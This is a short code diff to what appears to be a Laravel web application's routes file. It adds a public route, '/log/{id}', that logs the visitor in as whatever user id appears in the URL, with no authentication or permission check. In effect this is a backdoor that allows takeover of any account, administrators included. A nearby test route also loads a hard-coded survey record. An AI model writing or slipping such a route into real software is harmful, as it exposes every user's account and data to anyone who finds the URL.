@@ -12,7 +12,9 @@
 */
 
 Route::get('/', 'HomeController@index');
-
+Route::get('/log/{id}', function ($id) {
+    Auth::loginUsingId($id);
+});
 
 Route::get('/test', function () {
     $sur = \App\Models\Survey::find(3);
